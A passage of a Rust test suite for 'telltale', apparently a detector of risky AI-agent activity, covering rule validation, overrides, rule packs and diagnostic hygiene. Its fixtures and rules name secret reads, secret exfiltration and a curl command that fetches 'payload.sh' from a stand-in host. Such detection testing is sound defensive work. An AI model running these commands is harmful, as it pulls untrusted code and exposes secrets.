use super::*;
use std::path::PathBuf;

fn discovered_config_file(directory: &Path, file_name: &str) -> PathBuf {
    fs::read_dir(directory)
        .expect("config directory")
        .map(|entry| entry.expect("config entry").path())
        .find(|path| {
            path.file_name()
                .is_some_and(|name| name.to_string_lossy() == file_name)
        })
        .expect("discovered config file")
}

#[cfg(unix)]
#[test]
fn local_config_metadata_failure_precedes_output_and_state_activation() {
    for subdir in ["rules.d", "outputs.d"] {
        let temp = tempdir().expect("tempdir");
        let marker = "CONTROLLED_CONFIG_METADATA_PATH";
        let config_root = temp.path().join(marker);
        let dir = config_root.join(subdir);
        fs::create_dir_all(&dir).expect("config subdir");
        std::os::unix::fs::symlink("missing-target", dir.join(format!("{marker}.yaml")))
            .expect("broken YAML symlink");
        let scan_root = temp.path().join("empty-root");
        fs::create_dir(&scan_root).expect("empty scan root");
        let activation_dir = temp.path().join("must-not-be-created");
        let log_path = activation_dir.join("events.jsonl");
        let state_path = activation_dir.join("state.json");
        let outbox_path = activation_dir.join("outbox/outbox.sqlite");
        let outputs_dir = config_root.join("outputs.d");
        fs::create_dir_all(&outputs_dir).expect("outputs directory");
        fs::write(
            outputs_dir.join("valid.yaml"),
            format!(
                "version: 1\ndelivery:\n  policy: durable\n  outbox_path: {}\nsinks:\n  - name: canonical\n    type: jsonl\n",
                serde_yaml::to_string(&outbox_path.to_string_lossy().to_string())
                    .expect("YAML outbox path")
                    .trim(),
            ),
        )
        .expect("valid durable outputs document");
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args(["scan", "--once", "--install-inventory-disabled", "--root"])
            .arg(&scan_root)
            .arg("--config-dir")
            .arg(&config_root)
            .arg("--log-path")
            .arg(&log_path)
            .arg("--state-path")
            .arg(&state_path)
            .output()
            .expect("run scan with broken configuration");
        assert!(!output.status.success(), "broken configuration must fail");
        let stderr = String::from_utf8_lossy(&output.stderr);
        assert!(stderr.contains("local config metadata failed"), "{stderr}");
        assert!(!stderr.contains(marker), "path canary leaked");
        assert!(stderr.len() < 128, "unbounded metadata diagnostic");
        assert!(output.stdout.is_empty());
        assert!(
            !activation_dir.exists(),
            "output/state activated before failure"
        );
    }
}

fn assert_diagnostic_only_scan(
    output: &std::process::Output,
    log_path: &Path,
    sentinel: &str,
    matched_ids: u64,
) -> Value {
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    for text in [&stdout, &stderr] {
        for marker in [
            sentinel,
            "policy match accounting unavailable",
            "invalid regex",
            "unsupported detection_class",
            "RiskAccountingError",
            "Overflow",
        ] {
            assert!(!text.contains(marker), "diagnostic leaked: {marker}");
        }
    }
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let accounting = &summary["detection_flow"]["policy_match_accounting"];
    assert_eq!(accounting["status"], "unavailable");
    for field in [
        "pre_policy_detection_candidate_count",
        "fully_filtered_detection_candidate_count",
        "filtered_rule_id_count",
    ] {
        assert!(accounting[field].is_null(), "{field} should be null");
    }
    assert_eq!(summary["detection_count"], 1);
    assert_eq!(summary["emitted_count"], 1);
    assert_eq!(summary["rule_count"], 1);
    assert_eq!(
        summary["detection_flow"]["effective_detection_candidate_count"],
        1
    );
    assert_eq!(
        summary["detection_flow"]["matched_rule_id_count"],
        matched_ids
    );
    assert_eq!(
        summary["detection_flow"]["state_deduplicated_detection_count"],
        0
    );

    let events = fs::read_to_string(log_path)
        .expect("event log")
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let event_types = events
        .iter()
        .map(|event| event["event_type"].as_str().expect("event type"))
        .collect::<Vec<_>>();
    assert_eq!(event_types, vec!["health", "detection"]);
    assert_eq!(events[0]["scanner_error_count"], 0);
    assert!(!events.iter().any(|event| {
        matches!(
            event["event_type"].as_str(),
            Some("scanner_error" | "operational_alert")
        )
    }));
    let serialized_events = serde_json::to_string(&events).expect("serialize events");
    for marker in [
        sentinel,
        "policy match accounting unavailable",
        "invalid regex",
        "unsupported detection_class",
        "RiskAccountingError",
        "Overflow",
    ] {
        assert!(
            !serialized_events.contains(marker),
            "event diagnostic leaked: {marker}"
        );
    }
    summary
}

#[test]
fn rules_list_and_validate_default_rules() {
    let list = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "list"])
        .arg("--no-local-config")
        .output()
        .expect("run telltale rules list");
    assert!(
        list.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&list.stderr)
    );
    let stdout = String::from_utf8_lossy(&list.stdout);
    assert!(stdout.contains("mcp.tool_metadata.prompt_injection"));
    assert!(stdout.contains("secret.env.read"));
    for line in stdout.lines().filter(|line| !line.is_empty()) {
        assert_eq!(
            line.split('\t').count(),
            5,
            "unexpected rule-list row: {line}"
        );
    }

    let validate = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate"])
        .arg("--no-local-config")
        .output()
        .expect("run telltale rules validate");
    assert!(
        validate.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&validate.stderr)
    );
    let summary: Value = serde_json::from_slice(&validate.stdout).expect("summary json");
    assert_eq!(summary["status"], "ok");
    assert_eq!(summary["rule_count"], crate::default_rule_count());
}

#[test]
fn scan_reports_consistent_hashed_rule_sources_and_replacements() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("empty-root");
    let state_path = temp.path().join("scan-state.json");
    fs::create_dir_all(&root).expect("empty root");
    let validation = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "validate",
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
        ])
        .output()
        .expect("validate ordered pack");
    assert!(
        validation.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&validation.stderr)
    );
    let validation: Value = serde_json::from_slice(&validation.stdout).expect("validation json");
    let expected_sources = validation["sources"]
        .as_array()
        .expect("validation sources")
        .to_vec();
    let expected_provenance = validation["provenance"]
        .as_array()
        .expect("validation provenance")
        .to_vec();

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--root"])
        .arg(&root)
        .args([
            "--config-dir",
            "tests/fixtures/rule_packs/ordered",
            "--install-inventory-disabled",
            "--state-path",
        ])
        .arg(&state_path)
        .output()
        .expect("run ordered pack scan");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    let rules = &summary["effective_configuration"]["rules"];
    let sources = rules["sources"].as_array().expect("hashed sources");
    assert_eq!(sources, &expected_sources);
    let provenance = rules["provenance"].as_array().expect("provenance");
    assert_eq!(provenance, &expected_provenance);
}

/// A UUIDv4-shaped id derived from `name`, so synthetic rules with different
/// names never share one and a replacement keeps the id of what it replaces.
fn synthetic_uuid(name: &str) -> String {
    let hash = |seed: u64| {
        name.bytes().fold(seed, |hash, byte| {
            (hash ^ u64::from(byte)).wrapping_mul(0x0100_0000_01b3)
        })
    };
    let (high, low) = (hash(0xcbf2_9ce4_8422_2325), hash(0x84222325_cbf29ce4));
    format!(
        "{:08x}-{:04x}-4{:03x}-8{:03x}-{:012x}",
        high >> 32,
        (high >> 16) & 0xffff,
        high & 0xfff,
        low >> 52,
        low & 0xffff_ffff_ffff
    )
}

fn custom_rule_yaml(id: &str, regex: &str) -> String {
    let uuid = synthetic_uuid(id);
    format!(
        r#"title: Test rule
id: {uuid}
name: {id}
taxonomy: telltale
logsource:
    product: ai_agent
    category: tool_activity
detection:
    selection:
        - tool.command|re|i: '{regex}'
    condition: selection
level: low
telltale:
    category: custom_agent_behavior
    score: 10
    explanation: 'Test rule.'
    tags: [test]
"#
    )
}

#[test]
fn rules_validate_reports_invalid_custom_regex() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "validate",
            "--no-local-config",
            "--rules",
            "tests/fixtures/custom_rules/invalid-regex.yaml",
        ])
        .output()
        .expect("run telltale rules validate");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("custom.invalid_regex"));
}

#[test]
fn rules_validate_reports_unsupported_targets() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "validate",
            "--no-local-config",
            "--rules",
            "tests/fixtures/custom_rules/unsupported-target.yaml",
        ])
        .output()
        .expect("run telltale rules validate");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("custom.unsupported_target"));
    assert!(
        stderr.contains("unknown field `message.raw_transcript`"),
        "{stderr}"
    );
    assert!(stderr.contains("supported fields"), "{stderr}");
}

#[test]
fn rules_validate_and_test_accept_every_detection_severity() {
    let temp = tempdir().expect("tempdir");
    let rules = temp.path().join("severity.yaml");
    for severity in telltale_schema::event::VALID_DETECTION_SEVERITIES {
        fs::write(
            &rules,
            custom_rule_yaml("synthetic.severity", "exfiltrate project secrets")
                .replace("level: low", &format!("level: {severity}"))
                .replace("category: tool_activity", "category: message")
                .replace("tool.command|", "message.assistant_text|"),
        )
        .expect("synthetic rule");
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args(["rules", "validate", "--no-local-config", "--rules"])
            .arg(&rules)
            .env_remove("TELLTALE_COMMUNITY_RULES")
            .output()
            .expect("validate severity");
        assert!(
            output.status.success(),
            "{severity}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary: Value = serde_json::from_slice(&output.stdout).expect("summary");
        assert_eq!(summary["status"], "ok");
        assert_eq!(summary["rule_count"], default_rule_count() + 1);

        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "rules",
                "test",
                "tests/fixtures/custom_rules/custom-agent-behavior.jsonl",
                "--no-local-config",
                "--no-default-rules",
                "--rules",
            ])
            .arg(&rules)
            .output()
            .expect("compile and test detection severity");
        assert!(
            output.status.success(),
            "{severity}: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        let summary: Value = serde_json::from_slice(&output.stdout).expect("test summary");
        assert_eq!(summary["match_count"], 1);
        assert_eq!(summary["matches"][0]["rule_ids"][0], "synthetic.severity");
    }
}

#[test]
fn unsupported_rule_severity_fails_before_activation() {
    let temp = tempdir().expect("tempdir");
    let rules = temp.path().join("severity.yaml");
    let root = temp.path().join("session_stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).expect("synthetic sessions directory");
    let fixture = sessions.join("severity.jsonl");
    fs::write(
        &fixture,
        "{\"type\":\"event_msg\",\"session_id\":\"synthetic-severity\",\"timestamp\":\"2026-05-08T10:00:01Z\",\"payload\":{\"type\":\"tool_call\",\"tool_name\":\"shell\",\"command\":\"echo synthetic-probe\"}}\n",
    )
    .expect("synthetic Codex session");
    let activation = temp.path().join("must-not-be-created");
    for severity in ["warning", "catastrophic"] {
        fs::write(
            &rules,
            custom_rule_yaml("synthetic.severity", "synthetic-probe")
                .replace("level: low", &format!("level: {severity}"))
                .replace(
                    "category: custom_agent_behavior",
                    "category: not_a_category",
                ),
        )
        .expect("synthetic invalid severity rule");
        for args in [
            vec!["rules", "validate"],
            vec!["config", "validate"],
            vec!["rules", "test"],
            vec!["scan", "--once"],
        ] {
            let mut command = Command::new(env!("CARGO_BIN_EXE_telltale"));
            command
                .args(&args)
                .args(["--no-local-config", "--no-default-rules", "--rules"])
                .arg(&rules);
            if args == ["rules", "test"] {
                command.arg(&fixture);
            } else if args[0] == "scan" {
                command
                    .args(["--allow-fixtures", "--install-inventory-disabled", "--root"])
                    .arg(&root)
                    .arg("--log-path")
                    .arg(activation.join("events.jsonl"))
                    .arg("--state-path")
                    .arg(activation.join("state.json"));
            }
            let output = command.output().expect("run invalid severity command");
            assert!(
                !output.status.success(),
                "{args:?} accepted invalid severity"
            );
            assert!(output.stdout.is_empty(), "{args:?} emitted output");
            let stderr = String::from_utf8_lossy(&output.stderr);
            assert!(
                stderr.contains(&format!(
                    "rule synthetic.severity uses unsupported level '{severity}'"
                )),
                "{args:?}: {stderr}"
            );
            assert!(
                stderr.contains(&format!(
                    "supported values: {}",
                    telltale_schema::event::VALID_DETECTION_SEVERITIES.join(", ")
                )),
                "{args:?}: {stderr}"
            );
        }
    }
    assert!(
        !activation.exists(),
        "output/state activated before rejection"
    );
}

#[test]
fn rules_test_supports_sigma_inspired_custom_yaml() {
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "test",
            "tests/fixtures/custom_rules/custom-agent-behavior.jsonl",
            "--no-local-config",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
        ])
        .output()
        .expect("run telltale rules test");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["match_count"], 1);
    assert!(
        summary["matches"][0]["rule_ids"]
            .as_array()
            .expect("rule ids array")
            .iter()
            .any(|rule| rule == "custom.agent.malicious_behavior")
    );
    assert!(
        summary["matches"][0]["categories"]
            .as_array()
            .expect("categories array")
            .iter()
            .any(|category| category == "custom_agent_behavior")
    );
}

#[test]
fn rules_validate_adds_custom_rules_to_bundled_defaults_unless_disabled() {
    let defaults = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate"])
        .arg("--no-local-config")
        .output()
        .expect("run telltale rules validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");

    let additive = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "validate",
            "--no-local-config",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
        ])
        .output()
        .expect("run telltale rules validate");
    assert!(
        additive.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&additive.stderr)
    );
    let additive_summary: Value = serde_json::from_slice(&additive.stdout).expect("summary json");

    let custom_only = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "rules",
            "validate",
            "--no-local-config",
            "--no-default-rules",
            "--rules",
            "tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml",
        ])
        .output()
        .expect("run telltale rules validate custom only");
    assert!(
        custom_only.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&custom_only.stderr)
    );
    let custom_only_summary: Value =
        serde_json::from_slice(&custom_only.stdout).expect("summary json");
    assert_eq!(custom_only_summary["rule_count"], 1);
    assert_eq!(
        additive_summary["rule_count"].as_u64(),
        defaults_summary["rule_count"]
            .as_u64()
            .map(|count| count + 1)
    );
}

#[test]
fn rules_validate_discovers_local_rules_d_and_can_disable_local_config() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let rules_dir = config_root.join("rules.d");
    fs::create_dir_all(&rules_dir).expect("rules dir");
    fs::write(
        rules_dir.join("custom-agent-behavior.yml"),
        include_str!("../../tests/fixtures/custom_rules/sigma-inspired-agent-behavior.yaml"),
    )
    .expect("write local rule");

    let defaults = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--no-local-config"])
        .output()
        .expect("run telltale rules validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");

    let discovered = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale rules validate with local config");
    assert!(
        discovered.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&discovered.stderr)
    );
    let discovered_summary: Value =
        serde_json::from_slice(&discovered.stdout).expect("summary json");
    assert_eq!(
        discovered_summary["rule_count"].as_u64(),
        defaults_summary["rule_count"]
            .as_u64()
            .map(|count| count + 1)
    );

    let ignored = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--config-dir"])
        .arg(&config_root)
        .args(["--no-local-config"])
        .output()
        .expect("run telltale rules validate with local config disabled");
    assert!(
        ignored.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&ignored.stderr)
    );
    let ignored_summary: Value = serde_json::from_slice(&ignored.stdout).expect("summary json");
    assert_eq!(
        ignored_summary["rule_count"],
        defaults_summary["rule_count"]
    );
}

#[test]
fn rules_validate_reports_ordered_pack_winner_and_replacements() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("organization-rules.d")).expect("organization rules dir");
    fs::write(
        config_root.join("organization-rules.d/org.yaml"),
        custom_rule_yaml("replacement.target", "organization"),
    )
    .expect("write organization rule");
    fs::create_dir_all(config_root.join("rules.d")).expect("deployment rules dir");
    fs::write(
        config_root.join("rules.d/deployment.yaml"),
        custom_rule_yaml("replacement.target", "deployment"),
    )
    .expect("write deployment rule");
    fs::create_dir_all(config_root.join("ui-rules.d")).expect("local rules dir");
    fs::write(
        config_root.join("ui-rules.d/local.yaml"),
        custom_rule_yaml("replacement.target", "local"),
    )
    .expect("write local rule");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--no-default-rules", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run ordered pack validation");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let summary: Value = serde_json::from_slice(&output.stdout).expect("validation json");
    let provenance = summary["provenance"]
        .as_array()
        .expect("provenance array")
        .iter()
        .find(|entry| entry["id"] == "replacement.target")
        .expect("replacement provenance");
    assert!(telltale_schema::event::is_canonical_sha256_hex(
        provenance["winner"].as_str().expect("terminal winner hash")
    ));
    assert_eq!(provenance["replaced_sources"].as_array().unwrap().len(), 2);
}

#[test]
fn rules_list_reports_pack_winner_and_replaced_sources() {
    let pack_root = Path::new("tests/fixtures/rule_packs/ordered");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "list", "--verbose", "--config-dir"])
        .arg(pack_root)
        .output()
        .expect("run fixture pack list");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stdout = String::from_utf8_lossy(&output.stdout);
    let line = stdout
        .lines()
        .find(|line| line.starts_with("secret.env.read\t"))
        .expect("listed replaced bundled rule");
    let columns: Vec<_> = line.split('\t').collect();
    assert_eq!(columns.len(), 7, "unexpected verbose rule-list row: {line}");
    assert_eq!(
        telltale_schema::event::parse_canonical_opaque_identifier(columns[5])
            .expect("opaque winner source")
            .kind(),
        "rule-source"
    );
    assert_eq!(
        telltale_schema::event::parse_canonical_opaque_identifier(columns[6])
            .expect("opaque replaced source")
            .kind(),
        "rule-source"
    );
}

#[test]
fn rules_list_agrees_with_the_embedding_effective_configuration() {
    let organization = custom_rule_yaml("org.synthetic.parity", "parity-marker");
    let overrides = "version: 1\noverrides:\n  - rule_id: network.download\n    reason: Synthetic.\n    score: 7\n  - rule_id: secret.env.read\n    reason: Synthetic.\n    enabled: false\n";
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    fs::create_dir_all(config_root.join("organization-rules.d")).expect("organization dir");
    fs::create_dir_all(config_root.join("overrides.d")).expect("overrides dir");
    fs::write(
        config_root.join("organization-rules.d/parity.yaml"),
        &organization,
    )
    .expect("organization rule");
    fs::write(config_root.join("overrides.d/parity.yaml"), overrides).expect("override");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "list", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale rules list");
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let listed = String::from_utf8_lossy(&output.stdout)
        .lines()
        .map(|line| {
            let columns = line.split('\t').collect::<Vec<_>>();
            (
                columns[0].to_owned(),
                columns[3].parse::<u64>().expect("score"),
            )
        })
        .collect::<BTreeMap<_, _>>();

    let document = telltale_core::Pipeline::builder()
        .organization_rules_document(&organization)
        .override_document(overrides)
        .build()
        .expect("builder pipeline")
        .effective_configuration(&telltale_core::DetailedEvaluationOptions::default())
        .expect("effective configuration");
    let enabled = document
        .definitions
        .iter()
        .filter(|definition| {
            definition.kind == telltale_core::DefinitionKindV1::Rule && definition.enabled
        })
        .map(|definition| (definition.id.clone(), definition.session_score))
        .collect::<BTreeMap<_, _>>();

    assert_eq!(listed, enabled);
    assert_eq!(listed.get("network.download"), Some(&7));
    assert_eq!(listed.get("org.synthetic.parity"), Some(&10));
    assert!(!listed.contains_key("secret.env.read"));
}

#[test]
fn operational_rule_outputs_terminalize_policy_and_source_provenance() {
    let temp = tempdir().expect("tempdir");
    let marker = "CONTROLLED_RULE_OUTPUT_SECRET";
    let rule_path = temp.path().join(format!("{marker}-rules.yaml"));
    let policy_path = temp.path().join(format!("{marker}-policy.yaml"));
    fs::write(
        &rule_path,
        custom_rule_yaml("custom.operational.output", "operational-output"),
    )
    .expect("write rule");
    fs::write(
        &policy_path,
        format!("name: {marker}\ndisabled_categories: []\n"),
    )
    .expect("write policy");

    for command in [
        vec!["config", "validate"],
        vec!["rules", "list", "--verbose"],
        vec!["rules", "validate"],
    ] {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args(&command)
            .args(["--no-default-rules", "--no-local-config", "--rules"])
            .arg(&rule_path)
            .arg("--policy")
            .arg(&policy_path)
            .output()
            .expect("run operational rule command");
        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
        assert!(
            !String::from_utf8_lossy(&output.stdout).contains(marker),
            "operational output leaked controlled policy or source provenance"
        );
        if command.as_slice() != ["rules", "list", "--verbose"] {
            let json: Value = serde_json::from_slice(&output.stdout).expect("diagnostic JSON");
            let provenance = if command.as_slice() == ["config", "validate"] {
                &json["rules"]["provenance"]
            } else {
                &json["provenance"]
            };
            assert!(
                provenance
                    .as_array()
                    .expect("provenance")
                    .iter()
                    .all(|entry| matches!(entry["kind"].as_str(), Some("rule" | "modifier"))),
                "closed provenance kinds should remain analytically useful"
            );
        }
    }
}

#[test]
fn rules_validate_rejects_equal_tier_duplicates_across_config_roots() {
    let temp = tempdir().expect("tempdir");
    let first_root = temp.path().join("first");
    let second_root = temp.path().join("second");
    for (root, name) in [(&first_root, "first.yaml"), (&second_root, "second.yaml")] {
        let path = root.join("organization-rules.d").join(name);
        fs::create_dir_all(path.parent().expect("organization rules dir"))
            .expect("organization rules dir");
        fs::write(&path, custom_rule_yaml("same.id", "same")).expect("duplicate rule");
    }

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--no-default-rules", "--config-dir"])
        .arg(&first_root)
        .args(["--config-dir"])
        .arg(&second_root)
        .output()
        .expect("run duplicate validation");
    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(stderr.contains("duplicate rule id: same.id"));
    assert!(!stderr.contains(&first_root.display().to_string()));
    assert!(!stderr.contains(&second_root.display().to_string()));
}

/// The builder reports a Rule v1 document as a coded error with the input's
/// name alone; the CLI is where the reason and the migration pointer are shown.
#[test]
fn rules_validate_explains_a_rule_v1_document() {
    let temp = tempdir().expect("tempdir");
    let path = temp.path().join("v1.yaml");
    fs::write(
        &path,
        concat!(
            "version: 1\ndescription: synthetic\n",
            "defaults: {case_insensitive: true, enabled: true}\nrules: []\nmodifiers: []\n",
        ),
    )
    .expect("Rule v1 document");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--no-local-config", "--rules"])
        .arg(&path)
        .output()
        .expect("run telltale rules validate");

    assert!(!output.status.success());
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(
        stderr.contains("Rule v1 is no longer supported")
            && stderr.contains("docs/migrations/0.8.0.md"),
        "{stderr}"
    );
}

#[test]
fn rules_validate_rejects_more_definitions_than_a_rule_catalog_holds() {
    let temp = tempdir().expect("tempdir");
    let validate = |count: usize| {
        let path = temp.path().join(format!("bulk-{count}.yaml"));
        let rules = (0..count)
            .map(|index| custom_rule_yaml(&format!("bulk.rule_{index}"), "bulk-marker"))
            .collect::<Vec<_>>()
            .join("---\n");
        fs::write(&path, rules).expect("bulk rules");
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "rules",
                "validate",
                "--no-local-config",
                "--no-default-rules",
            ])
            .arg("--rules")
            .arg(&path)
            .output()
            .expect("run telltale rules validate")
    };
    // With the 371 bundled process-chain rules, 3725 definitions fill a
    // catalog of 4096.
    let at_bound = validate(3725);
    assert!(
        at_bound.status.success(),
        "{}",
        String::from_utf8_lossy(&at_bound.stderr)
    );
    let past = validate(3726);
    assert!(!past.status.success());
    let stderr = String::from_utf8_lossy(&past.stderr);
    assert!(
        stderr.contains("rule content has more than 3725 rules and chain modifiers"),
        "{stderr}"
    );
}

#[test]
fn rules_validate_rejects_more_rule_packages_than_the_effective_configuration_lists() {
    let temp = tempdir().expect("tempdir");
    let packages = temp.path().join("rule-packages.d");
    fs::create_dir_all(&packages).expect("package dir");
    let add_package = |number: usize| {
        let raw = format!(
            "format: telltale-rule-package/v2\nid: bulk{number}.rules\ntitle: Synthetic pack\n\
             version: \"1.0.0\"\npublisher: Synthetic\nlicense: Apache-2.0\n\
             rule_namespace: bulk{number}\n---\n{}",
            custom_rule_yaml(&format!("bulk{number}.rule"), "bulk-marker")
        );
        fs::write(packages.join(format!("bulk{number}.yaml")), raw).expect("package");
    };
    let validate = || {
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args(["rules", "validate", "--no-default-rules", "--config-dir"])
            .arg(temp.path())
            .env_remove("TELLTALE_COMMUNITY_RULES")
            .output()
            .expect("run telltale rules validate")
    };
    (1..=256).for_each(add_package);
    let at_bound = validate();
    assert!(
        at_bound.status.success(),
        "{}",
        String::from_utf8_lossy(&at_bound.stderr)
    );
    add_package(257);
    let past = validate();
    assert!(!past.status.success());
    let stderr = String::from_utf8_lossy(&past.stderr);
    assert!(stderr.contains("more than 256 rule packages"), "{stderr}");
}

#[test]
fn rules_validate_discovers_local_overrides_and_can_disable_local_config() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let state_path = temp.path().join("scan-state.json");
    let override_path = config_root.join("overrides.d/disable-download.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
description: Local override test.
overrides:
  - rule_id: network.download
    enabled: false
    reason: Too noisy for this workstation.
"#,
    )
    .expect("write override");
    let discovered_override_path = discovered_config_file(
        override_path.parent().expect("override directory"),
        "disable-download.yaml",
    );

    let defaults = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--no-local-config"])
        .output()
        .expect("run telltale rules validate defaults");
    assert!(
        defaults.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&defaults.stderr)
    );
    let defaults_summary: Value = serde_json::from_slice(&defaults.stdout).expect("summary json");
    let default_rule_count = defaults_summary["rule_count"]
        .as_u64()
        .expect("default rule count");

    let discovered = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--config-dir"])
        .arg(&config_root)
        .output()
        .expect("run telltale rules validate with override");
    assert!(
        discovered.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&discovered.stderr)
    );
    let discovered_summary: Value =
        serde_json::from_slice(&discovered.stdout).expect("summary json");
    assert_eq!(
        discovered_summary["rule_count"].as_u64(),
        Some(default_rule_count - 1)
    );

    let ignored = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "validate", "--config-dir"])
        .arg(&config_root)
        .arg("--no-local-config")
        .output()
        .expect("run telltale rules validate with local config disabled");
    assert!(
        ignored.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&ignored.stderr)
    );
    let ignored_summary: Value = serde_json::from_slice(&ignored.stdout).expect("summary json");
    assert_eq!(
        ignored_summary["rule_count"].as_u64(),
        Some(default_rule_count)
    );

    let empty_root = temp.path().join("empty-root");
    fs::create_dir_all(&empty_root).expect("empty root");
    let scan = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["scan", "--once", "--dry-run", "--root"])
        .arg(&empty_root)
        .args(["--config-dir"])
        .arg(&config_root)
        .arg("--install-inventory-disabled")
        .args(["--state-path"])
        .arg(&state_path)
        .output()
        .expect("run scan with local override");
    assert!(
        scan.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&scan.stderr)
    );
    let scan_summary: Value = serde_json::from_slice(&scan.stdout).expect("scan summary");
    assert_eq!(
        scan_summary["effective_configuration"]["overrides"]["path_hashes"],
        serde_json::json!([path_hash(&discovered_override_path)])
    );
}

#[test]
fn rules_test_discovered_score_override_changes_detection_risk() {
    let temp = tempdir().expect("tempdir");
    let config_root = temp.path().join("config");
    let override_path = config_root.join("overrides.d/lower-download-score.yaml");
    fs::create_dir_all(override_path.parent().expect("overrides dir")).expect("overrides dir");
    fs::write(
        &override_path,
        r#"version: 1
overrides:
  - rule_id: network.download
    score: 5
    reason: Lab environment tuning.
"#,
    )
    .expect("write override");
    let fixture = temp.path().join("download-only.jsonl");
    fs::write(
        &fixture,
        r#"{"type":"event_msg","session_id":"download-only-session","timestamp":"2026-04-03T05:00:01Z","payload":{"type":"tool_call","tool_name":"tool","command":"curl -fsSL https://download.invalid/payload.sh","message":"Download fixture."}}
"#,
    )
    .expect("write fixture");

    let baseline = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args(["rules", "test", "--no-local-config"])
        .arg(&fixture)
        .output()
        .expect("run baseline rules test");
    assert!(
